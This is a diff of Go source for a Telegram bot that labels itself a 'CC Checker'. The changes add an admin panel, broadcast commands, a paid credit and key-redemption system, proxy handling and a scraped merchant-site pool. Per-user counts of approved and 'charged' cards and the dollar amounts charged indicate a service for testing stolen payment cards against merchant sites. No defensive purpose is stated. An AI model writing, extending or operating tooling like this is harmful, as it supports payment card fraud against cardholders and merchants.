-				em("5382261056078881010", "➖")+"  /rmadmin &lt;id&gt;      — Remove dynamic admin\n"+
-				em("5956160118088273784", "🔑")+"  /giveperm &lt;id&gt; &lt;cmd&gt;   — Grant command permission\n\n"+
-				em("5224450179368767019", "🌐")+"  /addsite &lt;url&gt;     — Add custom site\n"+
-				em("5445267414562389170", "🗑")+"  /rmsite &lt;url&gt;      — Remove custom site\n"+
-				em("5197269100878907942", "📋")+"  /site all          — List all sites\n\n"+
-				em("5231200819986047254", "📊")+"  /stats             — Global stats\n"+
-				em("5264727218734524899", "🔄")+"  /resetstats        — Reset all stats\n\n"+
-				em("5247120584420114337", "⚡")+"  /active            — Active sessions\n"+
-				em("5461137245706685869", "🛑")+"  /stop &lt;id&gt;         — Stop user's session (also /stopall)\n"+
-				em("5461137245706685869", "🛑")+"  /stopuser &lt;@user|id&gt; — Stop specific user\n"+
-				em("5461137245706685869", "🛑")+"  /resetactive       — Force-cancel all sessions\n\n"+
-				em("5816625186216090280", "🔌")+"  /show &lt;id&gt;         — Show user's proxies\n"+
-				em("5458720093947063184", "🧹")+"  /cleanproxies      — Clean invalid proxy entries\n"+
-				em("5231012545799666522", "🔍")+"  /chkpr &lt;id&gt;        — Test user's proxies\n\n"+
-				em("5224450179368767019", "🌍")+"  /addgp &lt;id&gt;        — Add allowed group\n"+
-				em("5197269100878907942", "📋")+"  /showgp            — Show groups &amp; mode\n"+
-				em("6057529472351999246", "🗑")+"  /delgp &lt;id&gt;        — Remove group\n"+
-				em("5296369303661067030", "🔒")+"  /onlygp            — Groups-only mode\n"+
-				em("5296369303661067030", "🔓")+"  /allowall          — Allow all (private + groups)\n\n"+
-				em("5264727218734524899", "🔄")+"  /reboot            — Restart bot",
-			tele.ModeHTML)
+			em("5217822164362739968", "\xe2\x9c\x85") + " <b>Admin Panel</b> " + em("5217822164362739968", "\xe2\x9c\x85") + "\n" +
+				"========================\n\n" +
+				em("5877395722164247324", "\xe2\x9c\x85") + " <b>User Management</b>\n" +
+				"-> " + em("5352585602317426381", "\xe2\x9c\x85") + " /ban &lt;id&gt;        - Ban a user\n" +
+				"-> " + em("5206607081334906820", "\xe2\x9c\x85") + " /unban &lt;id&gt;      - Unban a user\n" +
+				"-> " + em("5296369303661067030", "\xe2\x9c\x85") + " /allowuser &lt;id&gt;  - Allow a user\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /removeuser &lt;id&gt; - Revoke access\n\n" +
+				em("5042328396193864923", "\xe2\x9c\x85") + " <b>Bot Control</b>\n" +
+				"-> " + em("5447644880824181073", "\xe2\x9c\x85") + " /pvtonly  - Toggle private mode\n" +
+				"-> " + em("5039778134807806727", "\xe2\x9c\x85") + " /free     - Toggle free mode\n" +
+				"-> " + em("5039671744172917707", "\xe2\x9c\x85") + " /stop     - Stop own session\n" +
+				"-> " + em("5042334757040423886", "\xe2\x9c\x85") + " /stopall  - Stop all sessions\n\n" +
+				em("5409048419211682843", "\xe2\x9c\x85") + " <b>Credit System</b>\n" +
+				"-> " + em("5041975203853239332", "\xe2\x9c\x85") + " /genkey &lt;credits|unlimited&gt; &lt;dur&gt; - Generate a key\n" +
+				"-> " + em("5296369303661067030", "\xe2\x9c\x85") + " /keys  - List active keys\n" +
+				"-> " + em("5042290883949495533", "\xe2\x9c\x85") + " /allkeys  - List all keys (history)\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /deactivate &lt;key&gt;  - Deactivate one key\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /deactivateall  - Deactivate all keys\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /delkey &lt;key&gt;  - Delete one key\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /delallkeys  - Delete all keys\n" +
+				"-> " + em("5409048419211682843", "\xe2\x9c\x85") + " /editfreelimit &lt;amount&gt;  - Change daily limit\n" +
+				"-> " + em("5999317873623831250", "\xe2\x9c\x85") + " /addcredit &lt;@u|id&gt; &lt;amt&gt;  - Add credits\n" +
+				"-> " + em("5039891861246838069", "\xe2\x9c\x85") + " /removecredit &lt;@u|id&gt; &lt;amt&gt;  - Remove credits\n\n" +
+				em("5039614900280754969", "\xe2\x9c\x85") + " <b>Site Management</b>\n" +
+				"-> " + em("5352585602317426381", "\xe2\x9c\x85") + " /addsite &lt;url&gt;  - Add site\n" +
+				"-> " + em("5039649904264217620", "\xe2\x9c\x85") + " /rmsite &lt;url&gt;   - Remove site\n" +
+				"-> " + em("5039600026809009149", "\xe2\x9c\x85") + " /blacklistsite  - Blacklist site\n" +
+				"-> " + em("5447644880824181073", "\xe2\x9c\x85") + " /scrsites       - Download pool\n" +
+				"-> " + em("5298970748172385213", "\xe2\x9c\x85") + " /site &lt;keyword&gt; - Search sites\n" +
+				"-> " + em("5042290883949495533", "\xe2\x9c\x85") + " /resetbl        - Reset blacklist\n\n" +
+				em("5039623284056917259", "\xe2\x9c\x85") + " <b>Info</b>\n" +
+				"-> " + em("4936468614967460670", "\xe2\x9c\x85") + " /stats  - Global stats\n" +
+				"-> " + em("4936468614967460670", "\xe2\x9c\x85") + " /active - Live sessions\n\n" +
+				em("4936468614967460670", "\xe2\x9c\x85") + " <b>Broadcast</b>\n" +
+				"-> " + em("5427168083074628963", "\xe2\x9c\x85") + " /broadcast &lt;msg&gt;        - Broadcast to all\n" +
+				"-> " + em("5040030395416969985", "\xe2\x9c\x85") + " /pvtbroadcast &lt;id&gt; &lt;msg&gt; - Broadcast to one user\n\n" +
+				em("5877395722164247324", "\xe2\x9c\x85") + " <b>Data & Proxies</b>\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /show &lt;id&gt;           - Show proxies\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /cleanproxies        - Clean proxies\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /chkpr &lt;id&gt;          - Test proxies\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /admins              - List admins\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /addadmin &lt;id&gt;       - Add admin\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /rmadmin &lt;id&gt;        - Remove admin\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /giveperm &lt;id&gt; &lt;cmd&gt; - Grant permission\n" +
+				"-> " + em("5039614900280754969", "\xe2\x9c\x85") + " /reboot              - Reboot bot\n\n" +
+				"========================\n" +
+				em("5877395722164247324", "\xe2\x9c\x85") + " Powered by @SORRY_00001",
+		tele.ModeHTML)
 	})
 
-	// /broadcast — send message to all known users
 	bot.Handle("/broadcast", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		fullText := c.Message().Text
 		idx := strings.Index(fullText, " ")
 		if idx < 0 || strings.TrimSpace(fullText[idx:]) == "" {
-			return c.Send("Usage: /broadcast <message>")
+			return c.Send("Usage: /broadcast &lt;message&gt;")
 		}
 		msg := strings.TrimSpace(fullText[idx:])
 		ids := um.AllIDs()
 		sent, failed := 0, 0
 		for _, uid := range ids {
-			_, err := bot.Send(tele.ChatID(uid), "📢 "+msg)
+			_, err := bot.Send(tele.ChatID(uid), " "+msg, tele.ModeHTML)
 			if err != nil {
 				failed++
 			} else {
 				sent++
 			}
 		}
-		return c.Send(fmt.Sprintf("📢 Broadcast complete\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
+		return c.Send(fmt.Sprintf(" Broadcast complete\n Sent: %d\n Failed: %d", sent, failed))
 	})
 
-	// /broadcastuser <id|@user> <message> — admin only
 	bot.Handle("/broadcastuser", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		parts := strings.SplitN(strings.TrimSpace(c.Message().Payload), " ", 2)
 		if len(parts) < 2 || strings.TrimSpace(parts[1]) == "" {
-			return c.Send("Usage: /broadcastuser <user_id> <message>")
+			return c.Send("Usage: /broadcastuser &lt;user_id&gt; &lt;message&gt;")
 		}
 		uid, err := strconv.ParseInt(strings.TrimSpace(parts[0]), 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
+			return c.Send(" Invalid user ID.")
 		}
 		msg := strings.TrimSpace(parts[1])
-		_, err = bot.Send(tele.ChatID(uid), "📢 "+msg)
+		_, err = bot.Send(tele.ChatID(uid), " "+msg, tele.ModeHTML)
 		if err != nil {
-			return c.Send(fmt.Sprintf("❌ Failed to send: %v", err))
+			return c.Send(fmt.Sprintf(" Failed to send: %v", err))
 		}
-		return c.Send(fmt.Sprintf("✅ Message sent to %d.", uid))
+		return c.Send(fmt.Sprintf(" Message sent to %d.", uid))
 	})
 
-	// /broadcastactive <message> — send to all users with active sessions
 	bot.Handle("/broadcastactive", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		msg := strings.TrimSpace(c.Message().Payload)
 		if msg == "" {
-			return c.Send("Usage: /broadcastactive <message>")
+			return c.Send("Usage: /broadcastactive &lt;message&gt;")
 		}
 		sent, failed := 0, 0
 		activeSessions.Range(func(key, val any) bool {
 			sess := val.(*CheckSession)
-			_, err := bot.Send(tele.ChatID(sess.UserID), "📢 "+msg)
+			_, err := bot.Send(tele.ChatID(sess.UserID), " "+msg, tele.ModeHTML)
 			if err != nil {
 				failed++
 			} else {
@@ -2015,44 +2838,57 @@ func main() {
 			}
 			return true
 		})
-		return c.Send(fmt.Sprintf("📢 Active broadcast\n✅ Sent: %d\n❌ Failed: %d", sent, failed))
+		return c.Send(fmt.Sprintf(" Active broadcast\n Sent: %d\n Failed: %d", sent, failed))
 	})
 
-	// /me — show personal stats
 	bot.Handle("/me", func(c tele.Context) error {
 		uid := c.Sender().ID
 		ud := um.Get(uid)
+		um.SetUsername(uid, c.Sender().Username)
 		um.mu.RLock()
 		s := ud.Stats
+		credits := ud.Credits
 		um.mu.RUnlock()
+		dailyCount := um.GetDailyCount(uid)
+		limit := currentDailyLimit()
+		remaining := limit - dailyCount
+		if remaining < 0 {
+			remaining = 0
+		}
 		approvedRate, chargedRate := 0.0, 0.0
 		if s.TotalChecked > 0 {
 			approvedRate = float64(s.TotalApproved) * 100.0 / float64(s.TotalChecked)
 			chargedRate = float64(s.TotalCharged) * 100.0 / float64(s.TotalChecked)
 		}
+		unlimited := ""
+		if um.HasUnlimited(uid) {
+			unlimited = "\n Unlimited: active"
+		}
 		return c.Send(fmt.Sprintf(
-			"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
-				"    👤  𝗣𝗲𝗿𝘀𝗼𝗻𝗮𝗹 𝗦𝘁𝗮𝘁𝘀\n"+
-				"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
-				"┌────────────────────────────┐\n"+
-				"│                              │\n"+
-				"│  📋  Total Checked  ∣  %6d  │\n"+
-				"│  ✅  Approved       ∣  %6d  │\n"+
-				"│  ❌  Declined       ∣  %6d  │\n"+
-				"│  💳  Charged        ∣  %6d  │\n"+
-				"│                              │\n"+
-				"└────────────────────────────┘\n\n"+
-				"💰  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁: $%.2f\n"+
-				"📈  ✅ Approved: %.1f%%  💳 Charged: %.1f%%\n"+
-				"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
+			"==============================\n" +
+				"    CC Checker - My Profile\n" +
+				"==============================\n\n" +
+				"  Credits: %s\n" +
+				"  Daily: %d / %d (remaining: %d)%s\n\n" +
+				"------------------------------\n" +
+				"                              \n" +
+				"  Total Checked  :  %6d  \n" +
+				"  Approved       :  %6d  \n" +
+				"  Declined       :  %6d  \n" +
+				"  Charged        :  %6d  \n" +
+				"                              \n" +
+				"------------------------------\n\n" +
+				"  Total Charged Amount: $%.2f\n" +
+				"  Approved: %.1f%%  Charged: %.1f%%\n" +
+				"==============================",
+		strconvFloat(credits), dailyCount, limit, remaining, unlimited,
 			s.TotalChecked, s.TotalApproved, s.TotalDeclined, s.TotalCharged,
-			s.TotalChargedAmt, approvedRate, chargedRate))
+			s.TotalChargedAmt, approvedRate, chargedRate), tele.ModeHTML)
 	})
 
-	// /resetstats — admin: reset all global stats
 	bot.Handle("/resetstats", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		um.mu.Lock()
 		for _, ud := range um.users {
@@ -2060,24 +2896,23 @@ func main() {
 		}
 		um.mu.Unlock()
 		um.Save()
-		return c.Send("✅ All stats have been reset.")
+		return c.Send(" All stats have been reset.")
 	})
 
-	// /restrict [all|id,...] — admin: block all non-admins or specific IDs
 	bot.Handle("/restrict", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		arg := strings.TrimSpace(c.Message().Payload)
 		if arg == "" {
-			return c.Send("Usage: /restrict all  or  /restrict <id1,id2,...>")
+			return c.Send("Usage: /restrict all  or  /restrict &lt;id1,id2,...&gt;")
 		}
 		if strings.ToLower(arg) == "all" {
 			cfg.mu.Lock()
 			cfg.RestrictAll = true
 			cfg.mu.Unlock()
 			cfg.Save()
-			return c.Send("🔒 Bot restricted — only explicitly allowed users can access.")
+			return c.Send(" Bot restricted - only explicitly allowed users can access.")
 		}
 		cfg.mu.Lock()
 		for _, tok := range strings.Split(arg, ",") {
@@ -2098,17 +2933,16 @@ func main() {
 		}
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(fmt.Sprintf("🔒 Restricted IDs updated: %v", cfg.BlockedIDs))
+		return c.Send(fmt.Sprintf(" Restricted IDs updated: %v", cfg.BlockedIDs))
 	})
 
-	// /allowonly <id1,id2,...> — admin: set allow-only list and enable restrict_all
 	bot.Handle("/allowonly", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		arg := strings.TrimSpace(c.Message().Payload)
 		if arg == "" {
-			return c.Send("Usage: /allowonly <id1,id2,...>")
+			return c.Send("Usage: /allowonly &lt;id1,id2,...&gt;")
 		}
 		var ids []int64
 		for _, tok := range strings.Split(arg, ",") {
@@ -2119,24 +2953,23 @@ func main() {
 			ids = append(ids, uid)
 		}
 		if len(ids) == 0 {
-			return c.Send("❌ No valid IDs found.")
+			return c.Send(" No valid IDs found.")
 		}
 		cfg.mu.Lock()
 		cfg.AllowOnlyIDs = ids
 		cfg.RestrictAll = true
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(fmt.Sprintf("✅ Allow-only mode enabled for: %v", ids))
+		return c.Send(fmt.Sprintf(" Allow-only mode enabled for: %v", ids))
 	})
 
-	// /unrestrict [all|id,...] — admin: lift restrictions
 	bot.Handle("/unrestrict", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		arg := strings.TrimSpace(c.Message().Payload)
 		if arg == "" {
-			return c.Send("Usage: /unrestrict all  or  /unrestrict <id1,id2,...>")
+			return c.Send("Usage: /unrestrict all  or  /unrestrict &lt;id1,id2,...&gt;")
 		}
 		if strings.ToLower(arg) == "all" {
 			cfg.mu.Lock()
@@ -2145,7 +2978,7 @@ func main() {
 			cfg.AllowOnlyIDs = nil
 			cfg.mu.Unlock()
 			cfg.Save()
-			return c.Send("🔓 All restrictions cleared.")
+			return c.Send(" All restrictions cleared.")
 		}
 		cfg.mu.Lock()
 		for _, tok := range strings.Split(arg, ",") {
@@ -2163,41 +2996,39 @@ func main() {
 		}
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(fmt.Sprintf("🔓 Blocked IDs updated: %v", cfg.BlockedIDs))
+		return c.Send(fmt.Sprintf(" Blocked IDs updated: %v", cfg.BlockedIDs))
 	})
 
-	// /admins — list all admins
 	bot.Handle("/admins", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		var sb strings.Builder
-		sb.WriteString("👑 Admins:\n")
+		sb.WriteString(" Admins:\n")
 		for id := range adminIDs {
-			sb.WriteString(fmt.Sprintf("• %d (hardcoded)\n", id))
+			sb.WriteString(fmt.Sprintf(". %d (hardcoded)\n", id))
 		}
 		cfg.mu.RLock()
 		for _, id := range cfg.DynamicAdmins {
 			if !adminIDs[id] {
-				sb.WriteString(fmt.Sprintf("• %d\n", id))
+				sb.WriteString(fmt.Sprintf(". %d\n", id))
 			}
 		}
 		cfg.mu.RUnlock()
 		return c.Send(sb.String())
 	})
 
-	// /addadmin <id> — add dynamic admin
 	bot.Handle("/addadmin", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /addadmin <user_id>")
+			return c.Send("Usage: /addadmin &lt;user_id&gt;")
 		}
 		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
+			return c.Send(" Invalid user ID.")
 		}
 		cfg.mu.Lock()
 		found := false
@@ -2212,24 +3043,23 @@ func main() {
 		}
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d added as admin.", uid), tele.ModeHTML)
+		return c.Send(fmt.Sprintf(" User %d added as admin.", uid))
 	})
 
-	// /rmadmin <id> — remove dynamic admin (cannot remove hardcoded)
 	bot.Handle("/rmadmin", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
 		}
 		raw := strings.TrimSpace(c.Message().Payload)
 		if raw == "" {
-			return c.Send("Usage: /rmadmin <user_id>")
+			return c.Send("Usage: /rmadmin &lt;user_id&gt;")
 		}
 		uid, err := strconv.ParseInt(raw, 10, 64)
 		if err != nil {
-			return c.Send(em(emojiCross, "❌")+" Invalid user ID.", tele.ModeHTML)
+			return c.Send(" Invalid user ID.")
 		}
 		if adminIDs[uid] {
-			return c.Send("❌ Cannot remove hardcoded admin.")
+			return c.Send(" Cannot remove hardcoded admin.")
 		}
 		cfg.mu.Lock()
 		newList := cfg.DynamicAdmins[:0]
@@ -2241,21 +3071,487 @@ func main() {
 		cfg.DynamicAdmins = newList
 		cfg.mu.Unlock()
 		cfg.Save()
-		return c.Send(em(emojiCheck, "✅")+fmt.Sprintf(" User %d removed from admins.", uid), tele.ModeHTML)
+		return c.Send(fmt.Sprintf(" User %d removed from admins.", uid))
 	})
 
-	// /giveperm <id> <cmd> — grant specific command permission to a user
-	bot.Handle("/giveperm", func(c tele.Context) error {
+	bot.Handle("/setdefaultcredits", func(c tele.Context) error {
 		if !isAdmin(c.Sender().ID) {
-			return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
+			return c.Send(" Admin only.")
+		}
+		amount, err := strconv.ParseFloat(strings.TrimSpace(c.Message().Payload), 64)
+		if err != nil || amount < 0 {
+			return c.Send("Usage: /setdefaultcredits <amount>\nExample: /setdefaultcredits 100")
+		}
+		cfg.mu.Lock()
+		cfg.DefaultCredits = amount
+		cfg.mu.Unlock()
+		cfg.Save()
+
+		um.mu.Lock()
+		count := 0
+		for _, ud := range um.users {
+			ud.Credits += amount
+			count++
+		}
+		um.mu.Unlock()
+		um.Save()
+
+		return c.Send(fmt.Sprintf(" Default credits set to %s.\nGranted %s to %d existing users.", strconvFloat(amount), strconvFloat(amount), count), tele.ModeHTML)
+	})
+
+	bot.Handle("/addcredit", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		parts := strings.Fields(c.Message().Payload)
+		if len(parts) < 2 {
+			return c.Send("Usage: /addcredit &lt;@username|user_id&gt; &lt;amount&gt;")
+		}
+		target := parts[0]
+		amount, err := strconv.ParseFloat(parts[1], 64)
+		if err != nil || amount <= 0 {
+			return c.Send(" Invalid amount. Must be a positive number (decimals allowed).")
+		}
+		var targetUID int64
+		if strings.HasPrefix(target, "@") {
+			uid, found := um.FindByUsername(target)
+			if !found {
+				return c.Send(fmt.Sprintf(" No known user with username %s.", target))
+			}
+			targetUID = uid
+		} else {
+			uid, err := strconv.ParseInt(target, 10, 64)
+			if err != nil {
+				return c.Send(" Invalid user ID or username.")
+			}
+			targetUID = uid
+		}
+		newBalance := um.AddCredits(targetUID, amount)
+		um.Save()
+		amountStr := strconvFloat(amount)
+		bot.Send(tele.ChatID(targetUID), " "+amountStr+" Credits was added to your balance.\n\n New balance: "+strconvFloat(newBalance)+"", tele.ModeHTML)
+		return c.Send(" Added " + amountStr + " credits to user " + strconv.FormatInt(targetUID, 10) + ". New balance: " + strconvFloat(newBalance) + "", tele.ModeHTML)
+	})
+
+	bot.Handle("/removecredit", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		parts := strings.Fields(c.Message().Payload)
+		if len(parts) < 2 {
+			return c.Send("Usage: /removecredit &lt;@username|user_id&gt; &lt;amount&gt;")
+		}
+		target := parts[0]
+		amount, err := strconv.ParseFloat(parts[1], 64)
+		if err != nil || amount <= 0 {
+			return c.Send(" Invalid amount. Must be a positive number.")
+		}
+		var targetUID int64
+		if strings.HasPrefix(target, "@") {
+			uid, found := um.FindByUsername(target)
+			if !found {
+				return c.Send(fmt.Sprintf(" No known user with username %s.", target))
+			}
+			targetUID = uid
+		} else {
+			uid, err := strconv.ParseInt(target, 10, 64)
+			if err != nil {
+				return c.Send(" Invalid user ID or username.")
+			}
+			targetUID = uid
+		}
+		um.DeductCredits(targetUID, amount)
+		newBalance := um.GetCredits(targetUID)
+		if newBalance < 0 {
+			newBalance = 0
+		}
+		um.Save()
+		amountStr := strconvFloat(amount)
+		bot.Send(tele.ChatID(targetUID), " "+amountStr+" Credits was removed from your balance.\n\n New balance: "+strconvFloat(newBalance)+"", tele.ModeHTML)
+		return c.Send(" Removed " + amountStr + " credits from user " + strconv.FormatInt(targetUID, 10) + ". New balance: " + strconvFloat(newBalance) + "", tele.ModeHTML)
+	})
+
+	bot.Handle("/redeem", func(c tele.Context) error {
+		uid := c.Sender().ID
+		code := strings.TrimSpace(c.Message().Payload)
+		if code == "" {
+			return c.Send("Usage: /redeem &lt;key&gt;")
+		}
+		um.SetUsername(uid, c.Sender().Username)
+		key, err := km.Redeem(code, uid)
+		if err != nil {
+			return c.Send(em(emojiCross, "\xe2\x9c\x85")+" "+err.Error(), tele.ModeHTML)
+		}
+		if key.Type == "credits" {
+			um.AddCredits(uid, float64(key.Credits))
+			um.Save()
+			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Key redeemed! %d credits added to your balance.", key.Credits), tele.ModeHTML)
+		}
+		if key.Type == "unlimited" {
+			var until int64
+			if key.ExpiresAt > 0 {
+				until = key.ExpiresAt
+			} else {
+				until = time.Now().Add(100 * 365 * 24 * time.Hour).Unix()
+			}
+			um.SetUnlimited(uid, until)
+			um.Save()
+			if key.ExpiresAt > 0 {
+				expStr := time.Unix(key.ExpiresAt, 0).Format("2006-01-02 15:04")
+				return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Unlimited access activated until %s", expStr), tele.ModeHTML)
+			}
+			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+" Unlimited access activated permanently!", tele.ModeHTML)
+		}
+		return c.Send(em(emojiCross, "\xe2\x9c\x85")+" Unknown key type.", tele.ModeHTML)
+	})
+
+	bot.Handle("/genkey", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		parts := strings.Fields(c.Message().Payload)
+		if len(parts) < 2 {
+			return c.Send("Usage: /genkey &lt;credits|unlimited&gt; &lt;amount|duration_hours&gt;\nExample: /genkey credits 100\n          /genkey unlimited 24\n          /genkey unlimited permanent")
+		}
+		keyType := parts[0]
+		if keyType != "credits" && keyType != "unlimited" {
+			return c.Send("Type must be 'credits' or 'unlimited'")
+		}
+		if keyType == "credits" {
+			credits, err := strconv.ParseInt(parts[1], 10, 64)
+			if err != nil || credits <= 0 {
+				return c.Send(" Credits must be a positive number")
+			}
+			key, _ := km.Generate("credits", credits, "\xe2\x9c\x85")
+			return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Key generated:\n%s\nType: credits\nAmount: %d", key.Code, key.Credits), tele.ModeHTML)
+		}
+		key, _ := km.Generate("unlimited", 0, parts[1])
+		durStr := parts[1] + " hours"
+		if parts[1] == "permanent" {
+			durStr = "permanent"
+		}
+		return c.Send(em(emojiCheck, "\xe2\x9c\x85")+fmt.Sprintf(" Key generated:\n%s\nType: unlimited\nDuration: %s", key.Code, durStr), tele.ModeHTML)
+	})
+
+	bot.Handle("/keys", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		active := km.Active()
+		if len(active) == 0 {
+			return c.Send(" No active keys.")
+		}
+		var sb strings.Builder
+		sb.WriteString(fmt.Sprintf(" Active Keys (%d):\n\n", len(active)))
+		for i, key := range active {
+			created := time.Unix(key.CreatedAt, 0).Format("01-02 15:04")
+			sb.WriteString(fmt.Sprintf("%d. %s\n   %s | %s\n   Created: %s\n", i+1, key.Code, key.Type, key.Duration, created))
+		}
+		return c.Send(sb.String(), tele.ModeHTML)
+	})
+
+	bot.Handle("/allkeys", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		all := km.AllHistory()
+		if len(all) == 0 {
+			return c.Send(" No keys in history.")
+		}
+		var sb strings.Builder
+		sb.WriteString(fmt.Sprintf(" All Keys (%d):\n\n", len(all)))
+		for i, key := range all {
+			created := time.Unix(key.CreatedAt, 0).Format("01-02 15:04")
+			status := "active"
+			if !key.Active {
+				status = "deactivated"
+			}
+			if key.ActivatedAt > 0 {
+				status += " (redeemed)"
+			}
+			sb.WriteString(fmt.Sprintf("%d. %s | %s | %s | %s | %s\n", i+1, key.Code, key.Type, key.Duration, created, status))
+		}
+		return c.Send(sb.String(), tele.ModeHTML)
+	})
+
+	bot.Handle("/deactivate", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		code := strings.TrimSpace(c.Message().Payload)
+		if code == "" {
+			return c.Send("Usage: /deactivate &lt;key&gt;")
+		}
+		if km.Deactivate(code) {
+			return c.Send(" Key deactivated: " + code)
+		}
+		return c.Send(" Key not found.")
+	})
+
+	bot.Handle("/deactivateall", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		count := km.DeactivateAll()
+		return c.Send(fmt.Sprintf(" Deactivated %d key(s).", count))
+	})
+
+	bot.Handle("/delkey", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		code := strings.TrimSpace(c.Message().Payload)
+		if code == "" {
+			return c.Send("Usage: /delkey &lt;key&gt;")
+		}
+		if km.Delete(code) {
+			return c.Send(" Key deleted: " + code)
+		}
+		return c.Send(" Key not found.")
+	})
+
+	bot.Handle("/delallkeys", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		count := km.DeleteAll()
+		return c.Send(fmt.Sprintf(" Deleted %d key(s).", count))
+	})
+
+	bot.Handle("/free", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		cfg.mu.Lock()
+		cfg.FreeMode = !cfg.FreeMode
+		state := cfg.FreeMode
+		cfg.mu.Unlock()
+		cfg.Save()
+		if state {
+			return c.Send(" Free mode ON - all users can check without credits.")
+		}
+		return c.Send(" Free mode OFF - normal credit system active.")
+	})
+
+	bot.Handle("/editfreelimit", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		raw := strings.TrimSpace(c.Message().Payload)
+		if raw == "" {
+			return c.Send("Usage: /editfreelimit &lt;amount&gt;")
+		}
+		limit, err := strconv.ParseInt(raw, 10, 64)
+		if err != nil || limit < 0 {
+			return c.Send(" Invalid amount.")
+		}
+		cfg.mu.Lock()
+		cfg.DailyLimit = limit
+		cfg.mu.Unlock()
+		cfg.Save()
+		dailyFreeLimit = limit
+		return c.Send(fmt.Sprintf(" Daily free limit set to %d.", limit))
+	})
+
+	bot.Handle("/blacklistsite", func(c tele.Context) error {
+		if !isAdmin(c.Sender().ID) {
+			return c.Send(" Admin only.")
+		}
+		site := strings.TrimSpace(c.Message().Payload)
+		if site == "" {
+			return c.Send("Usage: /blacklistsite &lt;url&gt;")
+		}
+		site = strings.TrimRight(site, "/")
+		if !strings.HasPrefix(site, "http") {
+			site = "https://" + site
+		}
